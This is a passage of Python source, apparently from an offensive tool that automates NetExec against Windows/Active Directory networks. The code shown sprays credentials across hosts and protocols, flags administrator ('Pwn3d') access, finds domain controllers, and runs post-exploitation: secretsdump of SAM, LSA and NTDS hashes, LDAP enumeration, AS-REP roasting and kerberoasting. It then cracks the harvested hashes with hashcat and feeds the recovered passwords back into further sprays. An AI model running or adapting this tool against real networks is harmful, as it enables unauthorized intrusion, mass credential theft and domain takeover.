        v1_clip = _truncate_text(v1, self._CFG_VAL_W)
        v2_clip = _truncate_text(v2, self._CFG_VAL2_W)
        return (
            f"  {self._pad_visible(k1, self._CFG_KEY_W)} {DIM}│{RESET} "
            f"{BOLD}{self._pad_visible(v1_clip, self._CFG_VAL_W)}{RESET} "
            f"{DIM}│{RESET} {self._pad_visible(k2, self._CFG_KEY2_W)} "
            f"{DIM}│{RESET} {BOLD}{self._pad_visible(v2_clip, self._CFG_VAL2_W)}{RESET}"
        )

    def _pacing_summary(self) -> str:
        parts: list[str] = []
        if self.delay > 0 or self.jitter > 0:
            parts.append(f"delay={self.delay}s±{self.jitter}s")
        if (
            self.netexec_timeout != NETEXEC_TIMEOUT
            or self.subprocess_timeout != SUBPROCESS_TIMEOUT
            or self.max_retry != MAX_RETRY
        ):
            parts.append(f"nxc-to={self.netexec_timeout}s")
            parts.append(f"py-to={self.subprocess_timeout}s")
            parts.append(f"retry={self.max_retry}")
        return " · ".join(parts)

    def _filters_summary(self) -> str:
        parts: list[str] = []
        if self.only_protocols:
            parts.append(f"only={','.join(sorted(self.only_protocols))}")
        if self.exclude_protocols:
            parts.append(f"exclude={','.join(sorted(self.exclude_protocols))}")
        if self.stop_on_success:
            parts.append("stop-on-success")
        return " · ".join(parts)

    def _collect_target_results(self, target: str, tasks: list[TaskKey], pair_count: int) -> dict[TaskKey, list[str]]:
        self.completed = 0
        self.total_tasks = len(tasks) * pair_count
        results: dict[TaskKey, list[str]] = {}

        # Each future handles one protocol/auth scope task and runs all credentials sequentially.
        with ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures: dict = {}
            for protocol, local_auth in tasks:
                fut = pool.submit(self._run_protocol_task, protocol, target, local_auth)
                futures[fut] = (protocol, local_auth)

            for future in as_completed(futures):
                key = futures[future]
                try:
                    results[key] = future.result()
                except FileNotFoundError as exc:
                    # A required binary (likely nxc) vanished mid-run.
                    msg = f"required command not found: {exc.filename or exc}"
                    results[key] = [f"[!] {msg}"]
                    self._record_error(msg)
                except PermissionError as exc:
                    msg = f"permission denied: {exc.filename or exc}"
                    results[key] = [f"[!] {msg}"]
                    self._record_error(msg)
                except MemoryError:
                    msg = "out of memory (subprocess output too large)"
                    results[key] = [f"[!] {msg}"]
                    self._record_error(msg)
                except Exception as exc:
                    msg = f"{type(exc).__name__}: {exc}"
                    results[key] = [f"[!] unexpected error: {msg}"]
                    self._record_error(msg)
        return results

    def _print_target_results(self, results: dict[TaskKey, list[str]], tasks: list[TaskKey]):
        """Dispatcher: concise per-host recap in default, full per-protocol
        block when -v or -vv is on. The aggregate FINAL REPORT prints once
        at the end of the run (see _print_final_report)."""
        if self.verbosity >= V_VERBOSE:
            self._print_target_results_verbose(results, tasks)
        else:
            self._print_target_results_recap(results, tasks)

    def _classify_task_outcome(self, parsed: list["ParsedStatus"]) -> str:
        """Map a list of parsed nxc status lines to a single outcome bucket.

        Buckets (most-significant first):
          'pwn3d'   → [+] with (Pwn3d!)
          'ok'      → [+] without Pwn3d
          'timeout' → [!] (connectivity issue / consecutive timeouts)
          'fail'    → [-] (auth rejected)
          'noop'    → nothing actionable (dead/no output)
        """
        if any(m == "[+]" and self._is_pwn3d(msg) for m, msg in parsed):
            return "pwn3d"
        if any(m == "[+]" for m, _ in parsed):
            return "ok"
        if any(m == "[!]" for m, _ in parsed):
            return "timeout"
        if any(m == "[-]" for m, _ in parsed):
            return "fail"
        return "noop"

    def _print_target_results_recap(self, results: dict[TaskKey, list[str]], tasks: list[TaskKey]):
        """One-line per-host recap grouped by outcome. The actual [+] credential
        lines were already printed live by _report_success_lines, so we don't
        repeat them here — we just summarise which protocols did what."""
        groups: dict[str, list[str]] = {"pwn3d": [], "ok": [], "timeout": [], "fail": [], "noop": []}

        for protocol, local_auth in tasks:
            key = (protocol, local_auth)
            blocks = results.get(key, [])
            parsed = self._parse_status_blocks(blocks)
            outcome = self._classify_task_outcome(parsed)
            groups[outcome].append(self._task_label(protocol, local_auth))

        # Print only buckets that have content (skip empty ones for compactness)
        printed = False
        for icon, key, color, dim in [
            (ICON_PWN3D,    "pwn3d",   RED,    False),
            (ICON_FINDING,  "ok",      GREEN,  False),
            (ICON_TIMEOUT,  "timeout", YELLOW, True),
            (ICON_FAIL,     "fail",    RED,    True),
        ]:
            items = groups[key]
            if not items:
                continue
            joined = ", ".join(items)
            line = f"  {icon} {DIM if dim else ''}{joined}{RESET}"
            print(line)
            printed = True

        # 'noop' is the most common — show it only as a quiet trailing summary
        if groups["noop"] and not printed:
            # Whole host had nothing actionable — say so plainly
            names = ", ".join(groups["noop"])
            print(f"  {DIM}— no response on: {names}{RESET}")
        elif groups["noop"]:
            # Mixed run: collapse the no-output protocols into one dim line
            count = len(groups["noop"])
            print(f"  {DIM}+ {count} other protocol(s) with no response{RESET}")
        print()

    def _print_target_results_verbose(self, results: dict[TaskKey, list[str]], tasks: list[TaskKey]):
        """Original full per-protocol breakdown — promoted to -v / -vv. The
        FINAL REPORT at end-of-run replaces the old per-host 'VALID
        CREDENTIALS' / 'ADMIN PWN3D' summary blocks."""
        target_info = self._extract_target_info(results)

        print(f"\n{DIM}{'─' * BANNER_WIDTH}{RESET}")
        print(f"  {CYAN}{BOLD}📋 Detailed Results{RESET}")
        print(f"{DIM}{'─' * BANNER_WIDTH}{RESET}")

        if target_info:
            print(f"    {DIM}{target_info}{RESET}")
        print()

        no_output_protos: set[str] = set()

        for protocol, local_auth in tasks:
            key = (protocol, local_auth)
            label = self._task_label(protocol, local_auth)
            blocks = results.get(key, [])

            if not blocks:
                no_output_protos.add(protocol.upper())
                continue

            parsed = self._parse_status_blocks(blocks)
            if not parsed:
                no_output_protos.add(protocol.upper())
                continue

            icon = self._status_icon(parsed)
            for i, (marker, msg) in enumerate(parsed):
                if i == 0:
                    prefix = f"  {icon} {BOLD}{label:<20}{RESET}"
                else:
                    prefix = f"      {'':<20}"

                if marker == "[+]":
                    if self._is_pwn3d(msg):
                        print(f"{prefix} {RED}{BOLD}💀 {msg}{RESET}")
                    else:
                        print(f"{prefix} {GREEN}{msg}{RESET}")
                elif marker == "[-]":
                    print(f"{prefix} {DIM}{msg}{RESET}")
                elif marker == "[!]":
                    print(f"{prefix} {YELLOW}{msg}{RESET}")

        if no_output_protos:
            ordered = [p for p in ALL_PROTOCOLS if p.upper() in no_output_protos]
            names = ", ".join(ordered)
            print(f"\n  {DIM}── No response: {names}{RESET}")
        print()

    # ---------------------------------------------------------------
    # Post-exploitation: DC detection, enum/modules, BloodHound
    # ---------------------------------------------------------------

    @staticmethod
    def _is_host_reachable(host: str, ports: tuple[int, ...] = (445, 22, 3389, 80, 139), timeout: float = 2.0) -> bool:
        """Stdlib-only TCP connect probe — try a small set of common ports
        with a short timeout, return True as soon as one accepts. Used as
        a default reachability check when --nmap is off so we don't waste
        15 worker-minutes spraying a dead /24.

        The port list is deliberately broad (SMB, SSH, RDP, HTTP, NetBIOS)
        because the spray covers more than just AD.

        Thread-free: non-blocking connects driven by a selector, with every
        socket closed before returning. We probe EVERY address getaddrinfo
        returns (both families) across all ports at once — exactly like
        socket.create_connection's all-addresses fallback — so a dual-stack
        name whose first (often IPv6) address is dead but whose IPv4 address
        listens is still seen as reachable; pinning to the first resolved
        address would silently drop such live hosts from the spray. A live
        host returns the instant any port accepts; a dead host costs ~one
        `timeout` total instead of len(ports) × timeout. Any socket-level
        error is treated as 'unreachable' rather than raised, so one bad
        target can't abort the whole discovery loop."""
        import errno
        import selectors
        import socket

        if not ports:
            return False  # mirror the old `for port in ports` no-op → False

        # Every (family, sockaddr) for every port. getaddrinfo builds the
        # correct sockaddr per family (incl. IPv6 flow/scope info), and we
        # keep ALL of them so multi-homed / dual-stack hosts are fully probed.
        targets: list[tuple[int, tuple]] = []
        for port in ports:
            try:
                for family, _st, _pr, _cn, sockaddr in socket.getaddrinfo(
                    host, port, type=socket.SOCK_STREAM
                ):
                    targets.append((family, sockaddr))
            except OSError:
                continue  # this lookup failed — another port/family may resolve
        if not targets:
            return False  # nothing resolvable → unreachable

        # errno values meaning "connect in flight": POSIX EINPROGRESS, the
        # Windows WSA equivalents, plus EWOULDBLOCK for good measure.
        pending = {errno.EINPROGRESS, errno.EWOULDBLOCK}
        for _name in ("WSAEINPROGRESS", "WSAEWOULDBLOCK"):
            code = getattr(errno, _name, None)
            if code is not None:
                pending.add(code)

        sel = selectors.DefaultSelector()
        socks: list[socket.socket] = []
        try:
            for family, sockaddr in targets:
                try:
                    sock = socket.socket(family, socket.SOCK_STREAM)
                    sock.setblocking(False)
                    socks.append(sock)
                    rc = sock.connect_ex(sockaddr)
                except OSError:
                    continue                # couldn't start this probe — try the rest
                if rc == 0:
                    return True             # connected immediately (e.g. localhost)
                if rc in pending:
                    sel.register(sock, selectors.EVENT_WRITE)
                # any other rc → refused/dead at once: just skip this socket
            deadline = time.monotonic() + timeout
            while sel.get_map():
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    return False            # ran out the clock with nothing up
                try:
                    ready = sel.select(remaining)
                except OSError:
                    return False
                if not ready:
                    return False
                for key, _mask in ready:
                    s = key.fileobj
                    # A writable non-blocking connect is either done or failed;
                    # SO_ERROR == 0 means the handshake actually completed.
                    try:
                        err = s.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
                    except OSError:
                        err = 1             # broken socket → treat as failed
                    if err == 0:
                        return True
                    sel.unregister(s)       # this one refused — keep waiting on the rest
            return False
        finally:
            sel.close()
            for s in socks:
                try:
                    s.close()
                except OSError:
                    pass

    def _bulk_probe_smb_banners(self, hosts_with_ports: dict[str, set[int]]):
        """Run _probe_smb_banner concurrently across all known-alive hosts.

        Without this, the per-host SMB info probe happened serially right
        before each host's spray header — adding ~5s × N hosts of dead
        wall-clock time. Now they run in a small thread pool while the
        spray pool warms up, so the first host header appears immediately."""
        candidates = [
            h for h, ports in hosts_with_ports.items()
            if (not ports or 445 in ports or 139 in ports)
            and h not in self.host_names  # don't re-probe cached
        ]
        if not candidates:
            return
        with ThreadPoolExecutor(max_workers=min(20, len(candidates))) as pool:
            futures = {
                # `or None`: when --nmap is off the ports set is empty, and
                # _probe_smb_banner treats a non-None empty set as "no SMB
                # ports → skip". Passing None means "ports unknown, probe
                # anyway" so the host name still gets resolved in the header.
                pool.submit(self._probe_smb_banner, h, hosts_with_ports.get(h) or None): h
                for h in candidates
            }
            for fut in as_completed(futures):
                try:
                    fut.result()
                except Exception as exc:  # noqa: BLE001
                    self._vprint(V_VERBOSE,
                                 f"  {DIM}probe failed for {futures[fut]}: {exc}{RESET}")

    def _probe_smb_banner(self, host: str, open_ports: set[int] | None = None):
        """Quick SMB banner probe to populate host_names / host_domain BEFORE
        the per-host header is printed during the spray. Done with a null /
        no-cred call to `nxc smb` — nxc emits the (name:...) (domain:...)
        info line even on STATUS_LOGON_FAILURE, so the probe is cheap and
        works against locked-down hosts.

        Skipped when:
          - we already know the name/domain (e.g. cached from a prior host),
          - --nmap is on AND port 445 is closed for this host,
          - nxc is missing (pre-flight should have caught it, but be safe)."""
        if host in self.host_names and host in self.host_domain:
            return
        if open_ports is not None and 445 not in open_ports and 139 not in open_ports:
            return
        cmd = ["nxc", "smb", host, "-u", "", "-p", "", "--timeout", "5"]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
            text = (result.stdout or "") + "\n" + (result.stderr or "")
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
            return
        m_name = SMB_NAME_RE.search(text)
        if m_name:
            self.host_names[host] = m_name.group(1).strip()
        m_domain = SMB_DOMAIN_RE.search(text)
        if m_domain:
            self.host_domain[host] = m_domain.group(1).strip().lower()

    def _detect_dc_from_results(
        self,
        host: str,
        results: dict[TaskKey, list[str]],
        open_ports: set[int] | None,
    ):
        """Scan SMB output blocks for (domain:...) and (name:...) info, then
        combine with nmap port signals to flag the host as a Domain Controller.
        Side effect: populate self.host_names / self.host_domain so the FINAL
        REPORT can show 'DC01.corp.local' next to the IP even when DNS PTR
        has nothing for the host."""
        domain_found: str | None = None
        name_found: str | None = None
        for (protocol, _local), blocks in results.items():
            if protocol != "smb":
                continue
            for block in blocks:
                if domain_found is None:
                    m = SMB_DOMAIN_RE.search(block)
                    if m:
                        domain_found = m.group(1).strip()
                if name_found is None:
                    m = SMB_NAME_RE.search(block)
                    if m:
                        name_found = m.group(1).strip()
                if domain_found and name_found:
                    break
            if domain_found and name_found:
                break

        if name_found:
            self.host_names[host] = name_found

        if not domain_found:
            return

        domain_lc = domain_found.lower()
        self.host_domain[host] = domain_lc
        self.domain_hosts.setdefault(domain_lc, set()).add(host)

        # Signal B: LDAP (389/636) AND SMB (445) open → very likely a DC
        looks_like_dc = False
        source = "smb_banner"
        if open_ports is not None:
            has_ldap = 389 in open_ports or 636 in open_ports
            has_smb = 445 in open_ports
            if has_ldap and has_smb:
                looks_like_dc = True
                source = "nmap_ldap_smb"

        # If we can't validate via nmap (--nmap off), fall back to the SMB banner
        # signal alone — the host advertised a domain, so it speaks AD.
        if not looks_like_dc and open_ports is None:
            looks_like_dc = True

        if looks_like_dc:
            if self.cache:
                self.cache.record_dc(domain_lc, host, source)
            self._vprint(
                V_VERBOSE,
                f"  {CYAN}🩸 DC candidate{RESET} {DIM}{host} → domain={domain_lc} (source={source}){RESET}",
            )

    def _extract_valid_creds_from_results(
        self, host: str, results: dict[TaskKey, list[str]]
    ) -> list[dict]:
        """Return [{host, protocol, local_auth, credential, raw}] for each [+] line."""
        valid: list[dict] = []
        for (protocol, local_auth), blocks in results.items():
            for block in blocks:
                for raw_line in block.split("\n"):
                    marker, msg = self._parse_nxc_line(raw_line.strip())
                    if marker != "[+]":
                        continue
                    cred = self._match_msg_to_credential(msg, protocol)
                    if cred is None:
                        continue
                    valid.append({
                        "host": host,
                        "protocol": protocol,
                        "local_auth": local_auth,
                        "credential": cred,
                        "raw": msg,
                    })
        return valid

    def _match_msg_to_credential(self, msg: str, protocol: str) -> "Credential | None":
        """Best-effort: figure out which Credential produced a [+] line.

        nxc prints things like 'corp.local\\admin:Password' or '<user>:<hash>'.
        We score every candidate cred by how specifically it appears in the
        message and return the best match — preferring (user matched + secret
        matched) over (user only) over (secret only). Falls back to the only
        credential when the spray was single-cred."""
        msg_lc = msg.lower()
        best: tuple[int, Credential] | None = None

        for cred in self.credentials:
            user = (cred.user or "").lower()
            secret = (cred.nthash or cred.password or "")
            secret_lc = secret.lower()

            user_hit = bool(user) and user in msg_lc
            # For null-session creds (empty user), look for the tell-tale ':' artifact
            # that nxc emits, e.g. 'SMB  10.x  445  HOST  [+] \\:' or 'Guest:'.
            if not user:
                user_hit = ":" in msg
            secret_hit = (not secret) or (secret_lc in msg_lc)

            if user_hit and secret_hit:
                score = 3 if user else 2  # explicit user beats null-session match
                if best is None or score > best[0]:
                    best = (score, cred)
            elif user_hit:
                if best is None or 1 > best[0]:
                    best = (1, cred)

        if best:
            return best[1]
        return self.credentials[0] if len(self.credentials) == 1 else None

    # Cap for the classifier read-back. nxc's [+]/[-]/info markers always
    # appear early in the output (banner + first auth line) so 64 KB is
    # plenty even for NTDS dumps that may run to hundreds of MB.
    LOOT_HEAD_BYTES = 64 * 1024

    def _run_nxc_action(
        self,
        protocol: str,
        host: str,
        credential: "Credential",
        local_auth: bool,
        extra_args: list[str],
        loot_path: Path,
    ) -> NxcActionResult:
        """Run a follow-up nxc command and persist its output.

        Streams stdout straight to the loot file instead of buffering in RAM —
        critical for `--ntds` on real DCs where the dump can be hundreds of MB
        and `capture_output=True` would OOM. stderr stays in memory (always
        small) and is appended to the loot file after the run."""
        cmd = self._build_nxc_command(protocol, host, credential, local_auth)
        # Drop the --log clause: post-exploit output should live in loot/, not the main run log.
        if "--log" in cmd:
            i = cmd.index("--log")
            del cmd[i : i + 2]
        cmd.extend(extra_args)
        self._log_command(f"post-ex {' '.join(extra_args)}".strip(), cmd, target=host)

        try:
            loot_path.parent.mkdir(parents=True, exist_ok=True)
        except OSError as exc:
            self._record_error(f"cannot create loot dir {loot_path.parent}: {exc}")
            return NxcActionResult(ok=False, exit_code=13, stdout="", stderr=str(exc), loot_path=loot_path)

        try:
            with open(loot_path, "wb") as out_fh:
                proc = subprocess.run(
                    cmd,
                    stdout=out_fh,
                    stderr=subprocess.PIPE,
                    timeout=self.subprocess_timeout,
                )
            stderr_text = (proc.stderr.decode("utf-8", errors="replace") if proc.stderr else "").strip()
            if stderr_text:
                try:
                    with open(loot_path, "ab") as fh:
                        fh.write(b"\n--- stderr ---\n")
                        fh.write(stderr_text.encode("utf-8", errors="replace"))
                except OSError:
                    pass
            # Read only the head for the classifier — markers are always near the top.
            head = ""
            try:
                with open(loot_path, "rb") as fh:
                    head = fh.read(self.LOOT_HEAD_BYTES).decode("utf-8", errors="replace")
            except OSError:
                pass
            return NxcActionResult(
                ok=(proc.returncode == 0),
                exit_code=proc.returncode,
                stdout=head, stderr=stderr_text, loot_path=loot_path,
            )
        except subprocess.TimeoutExpired:
            try:
                loot_path.write_text(f"timed out after {self.subprocess_timeout}s")
            except OSError:
                pass
            return NxcActionResult(ok=False, exit_code=-1, stdout="", stderr="timed out", loot_path=loot_path)
        except FileNotFoundError as exc:
            self._record_error(f"nxc not found mid-run: {exc.filename}")
            return NxcActionResult(ok=False, exit_code=127, stdout="", stderr=str(exc), loot_path=loot_path)
        except PermissionError as exc:
            self._record_error(f"cannot write loot {loot_path}: {exc}")
            return NxcActionResult(ok=False, exit_code=13, stdout="", stderr=str(exc), loot_path=loot_path)
        except OSError as exc:
            # Disk full or similar mid-stream; we still want to keep going.
            self._record_error(f"I/O error writing {loot_path}: {exc}")
            return NxcActionResult(ok=False, exit_code=5, stdout="", stderr=str(exc), loot_path=loot_path)

    @staticmethod
    def _classify_action(result: NxcActionResult, ok_markers: list[str], extra_text: str = "") -> tuple[str, str, str]:
        """Decide icon + short note for a post-exploit action.

        Returns (status, icon, note) where status is 'ok' / 'noop' / 'fail'.
        ok_markers are substrings expected in result.combined OR in extra_text
        (used when output lands in a file rather than stdout, e.g. asreproast)."""
        if not result.ok and result.exit_code == -1:
            return "fail", ICON_TIMEOUT, "timed out"
        if not result.ok:
            return "fail", ICON_FAIL, f"subprocess exit {result.exit_code}"
        combined = (result.combined + "\n" + extra_text).lower()
        # Auth-level rejection means the cred has no privilege for this action.
        if NxcAutomator._contains_any_pattern(combined, AUTH_RESPONSE_PATTERNS):
            return "noop", ICON_NOOP, "access denied (no privilege)"
        if not any(m.lower() in combined for m in ok_markers):
            return "noop", ICON_NOOP, "no data produced"
        return "ok", ICON_OK, ""

    def _record_error(self, msg: str):
        """Bookkeeping for --strict and the final summary."""
        self.strict_errors.append(msg)

    @staticmethod
    def _pick_best_cred(entries: list[dict]) -> dict | None:
        """Strongest cred wins: domain auth > local, password > hash, with pwn3d
        always preferred over non-pwn3d."""
        if not entries:
            return None
        ranked = sorted(entries, key=lambda v: (
            0 if NxcAutomator._is_pwn3d(v["raw"]) else 1,
            v["local_auth"],
            v["credential"].is_hash,
        ))
        return ranked[0]

    def _post_exploit_host(self, host: str, host_valid: list[dict]):
        """Run SMB-side post-exploit (enum/modules/secretsdump) on the best
        SMB cred for this single host. LDAP enum is intentionally NOT done
        here — it's a domain-wide concern and runs once at end-of-run via
        _run_ldap_enum_pass() with the most-privileged cred across the
        entire engagement (see `nxa --bloodhound` workflow)."""
        if not (self.enum_enabled or self.modules or self.secretsdump):
            return

        smb_target = self._pick_best_cred([v for v in host_valid if v["protocol"] == "smb"])
        if smb_target:
            self._post_exploit_smb(host, smb_target)

    def _run_ldap_enum_pass(self):
        """End-of-run domain-wide LDAP enumeration.

        For every domain we discovered during the spray:
          1. Pick the most-privileged domain credential we found (Pwn3d!
             wins, then domain-auth, then password over hash).
          2. Identify the best DC IP / FQDN for the domain.
          3. Fire --users/--admin-count/--groups/--asreproast/--kerberoasting
             once against that DC.

        This replaces the per-host LDAP enum that used to fire with whatever
        cred happened to validate on the local host — which on a typical
        engagement meant low-priv enumeration and missing data."""
        if not self.enum_enabled:
            return
        if not self.domain_hosts:
            return

        print(f"\n{'─' * BANNER_WIDTH}")
        print(f"  {ICON_SUBTASK} {BOLD}Domain-wide LDAP enumeration{RESET}")
        print(f"{'─' * BANNER_WIDTH}")

        for domain in self.domain_hosts:
            cred_entry = self._pick_best_domain_cred(domain)
            if not cred_entry:
                print(f"  {ICON_NOOP} {domain} {DIM}no domain credential available — skipped{RESET}")
                continue
            cred = cred_entry["credential"]
            is_admin = self._is_pwn3d(cred_entry["raw"])
            cred_marker = f"{RED}{BOLD}(Pwn3d!){RESET}" if is_admin else f"{DIM}(non-admin){RESET}"

            dc_ip, dc_source = self._pick_dc_for_domain(domain)
            if not dc_ip:
                print(f"  {ICON_NOOP} {domain} {DIM}no DC candidate identified — skipped{RESET}")
                continue

            user_display = BloodHoundRunner._strip_domain_prefix(cred.user)
            print(f"  {ICON_SUBTASK} {BOLD}{domain}{RESET} {DIM}via {dc_ip} [{dc_source}] as{RESET} "
                  f"{BOLD}{user_display}{RESET} {cred_marker}")

            host_dir = self.loot.dir_for("domain", LootStore.safe_name(domain), "ldap")
            for action in LDAP_ENUM_ACTIONS:
                out = host_dir / f"{action['name']}.txt"
                substituted = [str(out) if a == "{outfile}" else a for a in action["args"]]
                res = self._run_nxc_action("ldap", dc_ip, cred, False, substituted, out)
                extra = ""
                if action["name"] in ("asreproast", "kerberoasting") and out.exists():
                    try:
                        extra = out.read_text(errors="replace")
                    except OSError:
                        pass
                status, icon, note = self._classify_action(res, action["ok_markers"], extra)
                self._print_action(icon, action["name"], note, out, name_width=14)
                if status == "fail":
                    self._record_error(f"ldap {action['name']} on {domain}: {note}")
                if action["name"] in ("asreproast", "kerberoasting") and status == "ok":
                    self._harvest_kerberos_hashes(dc_ip, action["name"], out)

    def _is_likely_dc(self, host: str) -> bool:
        """Heuristic: a host is a DC if our nmap cache shows LDAP open on it.
        If we don't have cache data, fall back to 'maybe' (attempt anyway)."""
        if not self.cache:
            return True
        cached = self.cache.get_fresh(host)
        if cached is None:
            return True
        return any(cached.get(p) == "open" for p in (389, 636))

    def _print_action(self, icon: str, name: str, note: str, loot_path: Path, name_width: int = 12):
        suffix = f" {DIM}{note}{RESET}" if note else ""
        print(f"    {icon} {name:<{name_width}} {DIM}→ {_truncate_path(loot_path)}{RESET}{suffix}")

    def _post_exploit_smb(self, host: str, target: dict):
        cred = target["credential"]
        local = target["local_auth"]
        scope = self._auth_scope(local)
        is_pwn3d = self._is_pwn3d(target["raw"])
        host_dir = self.loot.dir_for(LootStore.safe_name(host), "smb", scope)

        if self.enum_enabled:
            print(f"\n  {ICON_SUBTASK} enum {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}){RESET}")
            for action in SMB_ENUM_ACTIONS:
                out = host_dir / f"{action['name']}.txt"
                res = self._run_nxc_action("smb", host, cred, local, action["args"], out)
                status, icon, note = self._classify_action(res, action["ok_markers"])
                self._print_action(icon, action["name"], note, out)
                if status == "fail":
                    self._record_error(f"enum {action['name']} on {host}: {note}")
                if action["name"] == "pass-pol" and status == "ok":
                    self._inspect_pass_pol(host, out)

        for mod in self.modules:
            print(f"\n  {ICON_SUBTASK} module {host} {DIM}(SMB {scope} as {cred.user or '<empty>'}) -M {mod}{RESET}")
            out = host_dir / f"module-{LootStore.safe_name(mod)}.txt"
            res = self._run_nxc_action("smb", host, cred, local, ["-M", mod], out)
            # Modules are opaque — we don't know what 'ok' looks like; trust exit code.
            if not res.ok:
                self._print_action(ICON_FAIL, mod, f"exit {res.exit_code}", out, name_width=24)
                self._record_error(f"module {mod} on {host} failed")
            elif res.combined.strip() == "":
                self._print_action(ICON_NOOP, mod, "no output", out, name_width=24)
            else:
                self._print_action(ICON_OK, mod, "", out, name_width=24)

        if self.secretsdump and is_pwn3d:
            self._dump_secrets(host, cred, local, host_dir)

    def _dump_secrets(self, host: str, cred: "Credential", local_auth: bool, host_dir: Path):
        """On (Pwn3d!) cred, dump SAM/LSA/NTDS hashes and grow the combo file."""
        print(f"\n  {ICON_PWN3D} secretsdump {host} {DIM}(SMB as {cred.user}){RESET}")
        for action in SMB_SECRETS_ACTIONS:
            name = action["name"]
            out = host_dir / f"secrets-{name}.txt"
            # Skip NTDS on non-DC hosts — nxc would just error out.
            if action["requires_dc"] and not self._is_likely_dc(host):
                self._print_action(ICON_SKIP, name, "not a DC", out, name_width=6)
                continue
            res = self._run_nxc_action("smb", host, cred, local_auth, action["args"], out)
            status, icon, note = self._classify_action(res, action["ok_markers"])
            self._print_action(icon, name, note, out, name_width=6)
            if status == "fail":
                self._record_error(f"secretsdump {name} on {host}: {note}")
            if status == "ok":
                self._harvest_smb_hashes(host, name, out)

    def _harvest_smb_hashes(self, host: str, source: str, out: Path):
        """Parse SAM/LSA/NTDS output for user:rid:lm:nt::: lines and append
        as 'user:lm:nt' to the combo-grow file. If --crack is on, fire
        hashcat on the freshly-collected NT hashes."""
        try:
            text = out.read_text(errors="replace")
        except OSError:
            return
        seen = 0
        for m in HASH_DUMP_LINE_RE.finditer(text):
            user, lm, nt = m.group("user"), m.group("lm"), m.group("nt")
            # Avoid duplicates
            entry = {"host": host, "source": source, "user": user, "lm": lm, "nt": nt}
            if entry in self.harvested_hashes:
                continue
            self.harvested_hashes.append(entry)
            seen += 1
        if seen:
            self._append_grow_combo(self.harvested_hashes[-seen:])
            print(f"    {GREEN}🧪 +{seen} hash(es) → {_truncate_path(self._effective_grow_combo())}{RESET}")
            if self.crack_enabled and self.cracker:
                self._crack_nt_hashes()

    def _crack_nt_hashes(self):
        """Write every harvested NT hash to a single file and crack it.
        Hashcat with the same potfile picks up new hashes incrementally."""
        nt_hashes = sorted({h["nt"] for h in self.harvested_hashes if h.get("nt")})
        if not nt_hashes:
            return
        cracked_dir = self.cracker.cracked_dir()
        hash_file = cracked_dir / "nt-hashes.txt"
        try:
            hash_file.write_text("\n".join(nt_hashes) + "\n")
        except OSError as exc:
            print(f"    {ICON_FAIL} cannot write {hash_file}: {exc}", file=sys.stderr)
            self._record_error(f"cracker hash-file write failed: {exc}")
            return
        wl = self.cracker.find_wordlist()
        print(f"    {ICON_CRACK} cracking {len(nt_hashes)} NT hash(es) with {_truncate_path(wl)}…")
        ok, pairs = self.cracker.crack("nt", hash_file)
        if not ok:
            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
            self._record_error(f"cracker failed on NT hashes: {self.cracker.last_stderr or 'unknown'}")
            return
        nt_to_user = {h["nt"].lower(): h["user"] for h in self.harvested_hashes if h.get("nt")}
        appended = 0
        for hash_str, plain in pairs:
            user = nt_to_user.get(hash_str.lower())
            if not user:
                continue
            entry = {"user": user, "password": plain, "source": "nt-crack"}
            if entry in self.cracked_creds:
                continue
            self.cracked_creds.append(entry)
            appended += 1
        if appended:
            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
            print(f"    {ICON_CRACK} {BOLD}cracked {appended}/{len(nt_hashes)}{RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
            for e in self.cracked_creds[-appended:]:
                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
        else:
            hint = self.cracker.diagnose_zero_cracks()
            tail = f" — {hint}" if hint else " — try --crack-rules best64 or a bigger wordlist"
            print(f"    {ICON_NOOP} 0/{len(nt_hashes)} cracked{tail}")

    def _harvest_kerberos_hashes(self, host: str, source: str, out: Path):
        """asreproast/kerberoasting output is already in hashcat-ready format
        (e.g. $krb5asrep$23$user@DOMAIN: ...). If --crack is on, fire hashcat
        on the file directly with the right -m mode."""
        try:
            text = out.read_text(errors="replace")
        except OSError:
            return
        # Count hashcat-style hashes for the summary
        n = text.count("$krb5")
        if n:
            print(f"    {GREEN}🧪 +{n} {source} hash(es) ready for hashcat{RESET}")
            self.harvested_hashes.append({"host": host, "source": source, "user": None, "lm": None, "nt": None, "kerberos_file": str(out), "count": n})
            if self.crack_enabled and self.cracker:
                self._crack_kerberos_hashes(out, source)

    def _crack_kerberos_hashes(self, hash_file: Path, source: str):
        """Run hashcat against an ASREProast (-m 18200) or Kerberoasting (-m 13100) file."""
        hash_type = "asrep" if source == "asreproast" else "tgs"
        user_re = KRB_AS_REP_USER_RE if hash_type == "asrep" else KRB_TGS_REP_USER_RE
        wl = self.cracker.find_wordlist()
        print(f"    {ICON_CRACK} cracking {source} with {_truncate_path(wl)}…")
        ok, pairs = self.cracker.crack(hash_type, hash_file)
        if not ok:
            print(f"    {ICON_FAIL} cracker did not run (see {_truncate_path(hash_file)})", file=sys.stderr)
            self._record_error(f"cracker failed on {source}: {self.cracker.last_stderr or 'unknown'}")
            return
        appended = 0
        for hash_str, plain in pairs:
            m = user_re.search(hash_str)
            user = m.group(1) if m else f"krb-{hash_type}"
            entry = {"user": user, "password": plain, "source": f"{source}-crack"}
            if entry in self.cracked_creds:
                continue
            self.cracked_creds.append(entry)
            appended += 1
        if appended:
            self._append_plain_creds_to_grow_combo(self.cracked_creds[-appended:])
            print(f"    {ICON_CRACK} {BOLD}cracked {appended} {source} hash(es){RESET} → appended to {_truncate_path(self._effective_grow_combo())}")
            for e in self.cracked_creds[-appended:]:
                print(f"      {GREEN}+ {e['user']}:{e['password']}{RESET}")
        else:
            hint = self.cracker.diagnose_zero_cracks()
            tail = f" — {hint}" if hint else ""
            print(f"    {ICON_NOOP} 0 cracked from {source}{tail}")

    def _append_plain_creds_to_grow_combo(self, entries: list[dict]):
        """Append plaintext (user, password) pairs to the grow-combo file —
        same format that --combo accepts on the next run."""
        path = self._effective_grow_combo()
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, "a") as fh:
            for e in entries:
                fh.write(f"{e['user']}:{e['password']}\n")

    def _effective_grow_combo(self) -> Path:
